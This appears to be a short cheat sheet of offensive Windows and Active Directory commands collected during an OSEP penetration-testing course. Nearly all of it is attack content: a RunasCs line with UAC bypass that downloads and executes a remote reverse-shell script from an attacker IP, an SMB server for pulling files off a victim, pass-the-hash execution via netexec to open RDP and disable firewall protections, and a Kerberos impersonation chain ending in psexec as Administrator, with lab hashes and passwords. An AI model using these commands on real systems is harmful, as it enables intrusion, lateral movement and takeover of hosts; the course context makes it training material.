Just a bunch of tools built/gathered along the OSEP course.

# <ins>Useful Basic Commands</ins>:

### <ins>Run command as another user</ins>:
- `Invoke-RunasCs amit 'Password123!' 'powershell iex(iwr http://192.168.45.185/rev.txt -usebasicparsing)' -ForceProfile -CreateProcessFunction 2 -BypassUac`

### <ins>Set up SMB server (file transfer)</ins>:
- `smbserver.py share $(pwd) -smb2support -username amit -password password`
- On Victim: `net use \\192.168.45.223\share /U:amit password`
- Copy files: `copy <FILENAME> \\192.168.45.223\share`

### <ins>Enable RDP and RestrictedAdmin from both Local/Remote</ins>:

Using command prompt: 
- `reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f && reg add "hklm\system\currentcontrolset\control\terminal server" /f /v fDenyTSConnections /t REG_DWORD /d 0 && netsh firewall set service remoteadmin enable && netsh firewall set service remotedesktop enable` 

Using netexec:
- `netexec smb db01 -u administrator -H faf3185b0a608ce2f8afb6f8d133f85b --local-auth -X 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f;reg add "hklm\system\currentcontrolset\control\terminal server" /f /v fDenyTSConnections /t REG_DWORD /d 0;netsh firewall set service remoteadmin enable;netsh firewall set service remotedesktop enable' --exec-method atexec`

### <ins>RDP to host using xfreerdp</ins>:
- `xfreerdp /v:172.16.231.221 /u:amit /p:'Password123!' +dynamic-resolution +clipboard`

Abuse:

    1. impacket-getST.py -spn cifs/dc.intelligence.htb -impersonate Administrator intelligence.htb/svc_int$ -hashes :67065141d298d67a17ee8626476b20f9
    2. export KRB5CCNAME=Administrator.ccache
    3. impacket-psexec -k -no-pass dc.intelligence.htb
